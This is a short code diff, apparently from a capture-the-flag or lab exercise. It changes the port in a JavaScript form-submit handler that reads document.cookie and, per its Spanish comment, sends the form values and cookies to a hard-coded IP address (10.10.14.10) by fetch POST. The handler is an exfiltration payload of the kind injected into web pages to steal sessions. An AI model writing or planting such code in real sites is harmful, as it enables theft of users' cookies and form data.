@@ -14,7 +14,7 @@ form.addEventListener('submit', function(event) {
   const cookies = document.cookie;
 
   // Envía los valores del formulario y las cookies a una dirección IP específica
-  fetch('http://10.10.14.10:8989/', {
+  fetch('http://10.10.14.10:80/', {
     method: 'POST',
     body: JSON.stringify({ reportTitle, description }),
     headers: {
